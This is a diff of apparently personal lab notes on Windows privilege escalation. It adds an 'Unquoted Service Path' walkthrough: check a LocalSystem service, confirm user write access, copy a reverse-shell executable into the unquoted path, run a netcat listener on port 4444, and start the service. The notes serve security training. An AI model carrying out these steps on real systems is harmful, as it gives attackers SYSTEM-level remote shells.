@@ -118,7 +118,7 @@ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
 **`on Windows Device`**
 
 ```ruby
-copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
+copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 ```
 
 - copy file from kali machine to windows
@@ -438,10 +438,75 @@ copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
 - <details>
       <summary>Unquoted Service Path</summary>
 
-
-
-
-
+     
+     
+     > ## in windows each service has :
+     > - **`BINARY_PATH_NAME`** : THE path with refer to the place that have **`exe`** that this service will run it
+     >   - if it's value writen without ``"..."`` that mean we can exploit it
+     
+     
+     ---
+     
+     ## 1. first get info about the service (unquotedsvc)
+     
+     ```ruby
+     sc qc unquotedsvc
+     ```
+     
+     ## - found two important things
+     
+     > - **`SERVICE_START_NAME : LocalSystem`** : that is mean this service work as **`SYSTEM`**
+     > - **`BINARY_PATH_NAME        : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`**
+     >>  - IT without ``"..."``
+     
+     
+     <img width="883" height="262" alt="image" src="https://github.com/user-attachments/assets/888cae7d-e707-4a32-bf40-02b668d079b5" />
+     
+     ---
+     
+     ## 2. TRY To know the privilege of current user on this path
+     
+     ```ruby
+     C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+     ```
+     
+     ## - **`RW BUILTIN\Users`** : that is mean any normal user can do read and write in this folder
+     
+     
+     <img width="823" height="173" alt="image" src="https://github.com/user-attachments/assets/418384ed-aeff-4838-91b8-966a9933ba4d" />
+     
+     
+     ---
+     
+     ## 3. move the reverse shell to the new path with new name 
+     
+     
+     ```ruby
+     copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+     ```
+     
+     <img width="778" height="82" alt="image" src="https://github.com/user-attachments/assets/28249e57-c476-4664-b89f-7b136ef20544" />
+     
+     
+     
+     ## 4. open listener on kali
+     
+     ```ruby
+     sudo nc -nvlp 4444
+     ```
+     
+     ## 5. run the service 
+     
+     ```ruby
+     net start unquotedsvc
+     ```
+     
+     <img width="963" height="412" alt="image" src="https://github.com/user-attachments/assets/5b8eaba2-2421-4e4d-9d67-96e604910b74" />
+     
+     ---
+     
+     <img width="1646" height="214" alt="image" src="https://github.com/user-attachments/assets/c25163f8-d4d4-4446-94b9-6398e62bcc7d" />
+     
 
 
 
